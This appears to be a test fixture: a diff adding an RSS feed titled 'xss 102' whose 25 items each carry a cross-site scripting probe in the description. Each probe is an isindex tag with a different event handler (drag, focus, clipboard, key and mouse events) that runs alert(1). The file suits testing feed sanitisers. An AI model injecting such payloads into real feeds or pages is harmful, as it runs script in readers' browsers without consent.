@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>xss 102</title>
+  <link>https://www.MJHKKQBFPBCACHFQMQCF.com</link>
+  <description>FNIPUJYVBYRVMRRZKXMN</description>
+  <item>
+    <title>HGEMJPMPIIMNPRIKYVSL</title>
+    <link>http://wwww.BXYSLFUCMRINLNWFIHKNJKVNDJTQECNTRZHOTIGY.com</link>
+    <description>
+      <isindex draggable="true" ondragenter="alert(1)">test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>WCEVHXWGAITAFVHPGHSZ</title>
+    <link>http://wwww.TFGDDXDSVDDVZPSCOXLNPZCTISYMMIDBCGHFGVQC.com</link>
+    <description>
+      <isindex draggable="true" ondragleave="alert(1)">test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>RVBGJMOIDSDEQFDTXWFG</title>
+    <link>http://wwww.LLVBUCLORGJUOUIAYTWTKPQXXHZPOLOGVNDNNJDO.com</link>
+    <description>
+      <isindex draggable="true" ondragstart="alert(1)">test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>OLDMKDAEZZTIAGOBIKJH</title>
+    <link>http://wwww.SVYOBMNTKTCPIRXCCXSIWKPVSEPIUQCAMCRLHKRC.com</link>
+    <description>
+      <isindex   onactivate=alert(1)></isindex>
+    </description>
+  </item>
+  <item>
+    <title>XMSARIETVUFNPFGVYFVS</title>
+    <link>http://wwww.TAVNBFUSYNKQSWUPNYUEMSBQNYXIWPSKFNAWTVYX.com</link>
+    <description>
+      <isindex   onbeforeactivate=alert(1)></isindex>
+    </description>
+  </item>
+  <item>
+    <title>UQCZSYBSNYBUARJNWGBG</title>
+    <link>http://wwww.AZBGEJDFYIUYGCHBOIEVUMLYLTOHJAOVMFUZBSSK.com</link>
+    <description>
+      <isindex   onbeforedeactivate=alert(1)></isindex><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>EMEWYKFKSDUGPXZSUKXG</title>
+    <link>http://wwww.RVRXNWRFXEHJKCSLFVRYKEXREHNUMIJESCLQEPXT.com</link>
+    <description>
+      <isindex   ondeactivate=alert(1)></isindex><input id=y autofocus>
+    </description>
+  </item>
+  <item>
+    <title>VUNPBWTXOWOELMSOCJTD</title>
+    <link>http://wwww.XCUXGOKBHLNDORBAWUZTNGIWHFBVYGKHOIRLKLKE.com</link>
+    <description>
+      <isindex   onfocus=alert(1)></isindex>
+    </description>
+  </item>
+  <item>
+    <title>DWSMWCUETJGIHTWMYVYT</title>
+    <link>http://wwww.LLDUSNZDKJESSPRNWPAXILSZFEIKSETNIIHIPSVW.com</link>
+    <description>
+      <isindex   onfocusin=alert(1)></isindex>
+    </description>
+  </item>
+  <item>
+    <title>NKQNHMIUIWXLBZGOQDNH</title>
+    <link>http://wwww.DFCKQBJLKJKLIPUVMKQGPIPDLURLVYTJRNNRKZWG.com</link>
+    <description>
+      <isindex onbeforecopy="alert(1)" contenteditable>test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>LUJPSDINJHGMHNNHJNGD</title>
+    <link>http://wwww.HTCUPLTVBADZGVTFSLHFVIXQOLYCGEAMVNVEKVAZ.com</link>
+    <description>
+      <isindex onbeforecut="alert(1)" contenteditable>test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>DEULVPKXXRENJSNMMEVA</title>
+    <link>http://wwww.RXQPZRZQYWKWJYBGVPRTDELMRKSXCSBPBBJXWHLO.com</link>
+    <description>
+      <isindex onbeforepaste="alert(1)" contenteditable>test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>EPHOLFHTCOYCSNVYOYIC</title>
+    <link>http://wwww.OQRXBPFTSDPGYQTEDGPSWUZKICHBRDMEHWVFTHOW.com</link>
+    <description>
+      <isindex onblur=alert(1)  ></isindex><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>FZLHEVSVNCKWDAWHRKPY</title>
+    <link>http://wwww.WUMNLVVOVAQLQTCWILACWKUQONZRZATLPUYKSHOL.com</link>
+    <description>
+      <isindex onclick="alert(1)">test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>TVKEHVXWRXPBSVEQWAZN</title>
+    <link>http://wwww.IPOYLNBUKLYATEPNKXYBECMYSDYRCXVMYNVDLYMB.com</link>
+    <description>
+      <isindex oncontextmenu="alert(1)">test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>IREWNHCABCLFVBTDCSAM</title>
+    <link>http://wwww.WJVUZIPNLOMWJVYWEBXHNPSQRFRMBONVKAMVIYXD.com</link>
+    <description>
+      <isindex oncopy="alert(1)" contenteditable>test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>NSTVNIGVBYWLNUGNVLIK</title>
+    <link>http://wwww.FXITVWSGTFEKVCJDSKOMLEOIIIQLFASTMZCNTYZS.com</link>
+    <description>
+      <isindex oncut="alert(1)" contenteditable>test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>HOYBXAHPKVRBOAEDAVET</title>
+    <link>http://wwww.FKDSNDHLSGZSXNLDFKYPXPPTBIFTKDVFYICSSIST.com</link>
+    <description>
+      <isindex ondblclick="alert(1)">test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>TPCZXUESBXIYSDNJBGMA</title>
+    <link>http://wwww.KGJURAXHEKMPPFNNYSACSINEZFAQUHNNQLBKSVDW.com</link>
+    <description>
+      <isindex onfocusout=alert(1)  ></isindex><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>NAIYYIBRUJERQGJDCYZP</title>
+    <link>http://wwww.SUGOWMDMQHPOBULLEQAPWFGCCJOTYAWROPNQEQAB.com</link>
+    <description>
+      <isindex onkeydown="alert(1)" contenteditable>test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>FDWDYDHJMWPPLWPSUKOO</title>
+    <link>http://wwww.NPDLUSFLVJXEERWNHNFIYRVRJUOFJUTRFGGKCCDB.com</link>
+    <description>
+      <isindex onkeypress="alert(1)" contenteditable>test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>AIDWSASSSTSTYKDRNPAV</title>
+    <link>http://wwww.NKLCWEMDCZRQLHSWMWVDKCXGHDBPLPPRJONKUICZ.com</link>
+    <description>
+      <isindex onkeyup="alert(1)" contenteditable>test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>OOGLVOCZHZFVJSBYKZRC</title>
+    <link>http://wwww.PHCGXZLEAZIOCERTLTJALFLRURVBHNSHWDKZFXTH.com</link>
+    <description>
+      <isindex onmousedown="alert(1)">test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>DTIVNHGFGWAZLYLJAVTQ</title>
+    <link>http://wwww.PXHQNPECRMHYVMUISLAXQFOLRRZXYALAMHCJNIHK.com</link>
+    <description>
+      <isindex onmouseenter="alert(1)">test</isindex>
+    </description>
+  </item>
+  <item>
+    <title>PRKFUPHXTBKCUUWETIZE</title>
+    <link>http://wwww.NEQPAJNZDHMVLGPVXYAZSKWROMREOIWSBZXWNHFJ.com</link>
+    <description>
+      <isindex onmouseleave="alert(1)">test</isindex>
+    </description>
+  </item>
+</channel>
+</rss>
